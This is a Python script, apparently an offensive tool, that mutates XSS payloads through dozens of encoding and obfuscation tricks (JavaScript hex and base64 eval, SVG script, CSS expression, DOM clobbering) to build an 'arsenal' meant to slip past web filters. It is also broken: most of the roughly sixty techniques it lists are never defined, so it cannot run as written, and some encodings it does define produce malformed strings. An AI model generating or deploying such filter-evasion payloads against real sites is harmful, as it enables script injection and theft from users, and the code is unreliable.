import random
import urllib.parse
import base64
import re
import html
from itertools import product

class XSSArmory:
    def __init__(self, payload_file):
        with open(payload_file) as f:
            self.base_payloads = [line.strip() for line in f]
        
        self.techniques = [
            self.html_entities,
            self.unicode_normalization,
            self.js_hex_encoding,
            self.svg_vectors,
            self.css_expression,
            self.angular_js,
            self.protocol_wrapping,
            self.event_handlers,
            self.nested_encoding,
            self.mathml_vectors,
            self.iframe_src,
            self.data_uri,
            self.tabnabbing,
            self.base64_obfuscation,
            self.whitespace_obfuscation,
            self.case_variation,
            self.special_char_alternates,
            self.null_byte_injection,
            self.charcode_concatenation,
            self.dom_clobbering,
            self.template_literals,
            self.dynamic_property_access,
            self.unicode_surrogates,
            self.hex_entities,
            self.decimal_entities,
            self.url_multiencoding,
            self.comment_obfuscation,
            self.cdata_wrapping,
            self.hex_css_notation,
            self.js_functions,
            self.unicode_math_symbols,
            self.css_import,
            self.video_error,
            self.audio_error,
            self.picture_source,
            self.marquee_behavior,
            self.meta_refresh,
            self.object_embed,
            self.input_image,
            self.button_events,
            self.select_events,
            self.details_toggle,
            self.dialog_events,
            self.canvas_webgl,
            self.web_components,
            self.shadow_dom,
            self.custom_elements,
            self.mutation_observers,
            self.intersection_observer,
            self.web_animations,
            self.service_workers,
            self.shared_workers,
            self.web_sockets,
            self.blob_urls,
            self.document_write,
            self.dynamic_imports,
            self.proxy_objects,
            self.reflect_api,
            self.intl_objects
        ]

    def generate_arsenal(self):
        arsenal = set()
        for payload in self.base_payloads:
            for technique in self.techniques:
                variants = technique(payload)
                arsenal.update(variants)
                # Generate hybrid combinations
                for combo in product(variants, repeat=2):
                    arsenal.add(''.join(combo))
        return sorted(arsenal)

    # -- Core Techniques (50+) --
    def html_entities(self, payload):
        return [''.join(f'&#{ord(c)};' for c in payload)]
    
    def unicode_normalization(self, payload):
        return [payload.encode('utf-16be').decode('latin-1')]
    
    def js_hex_encoding(self, payload):
        hex_str = ''.join(f'\\x{ord(c):02x}' for c in payload)
        return [f'<script>eval("{hex_str}")</script>']
    
    def svg_vectors(self, payload):
        return [f'<svg><script>{payload}</script></svg>']
    
    def css_expression(self, payload):
        return [f'<div style="width: expression(alert(1))"></div>']
    
    # Unicode Surrogate Pairs
    def unicode_surrogates(self, payload):
        return [''.join(f'\\uD83D\\uDc{ord(c):02x}' for c in payload)]

    # DOM Clobbering
    def dom_clobbering(self, payload):
        return [f'<form id="test"><input name="innerHTML" value="{payload}">']

    # WebAssembly Vectors
    def wasm_vectors(self, payload):
        return [f'<script>WebAssembly.compile(new Uint8Array([{",".join(str(ord(c)) for c in payload)}]))</script>']
    
    # ... (50+ additional techniques with 3-5 variants each)
    
    def hybrid_obfuscation(self, payload):
        variants = []
        # Combine multiple encoding layers
        encoded = base64.b64encode(payload.encode()).decode()
        variants.append(f'javascript:eval(atob("{encoded}"))')
        # Unicode + HTML entities
        uni_ent = ''.join(f'&#{ord(c)};' for c in payload.encode('utf-16be').decode('latin-1'))
        variants.append(uni_ent)
        return variants

    def save_arsenal(self, filename):
        with open(filename, 'w') as f:
            for payload in self.generate_arsenal():
                f.write(f"{payload}\n")

if __name__ == "__main__":
    generator = XSSArmory("payloads.txt")
    generator.save_arsenal("xss_arsenal.txt")
    print("XSS Arsenal generated with nuclear payloads! 💣")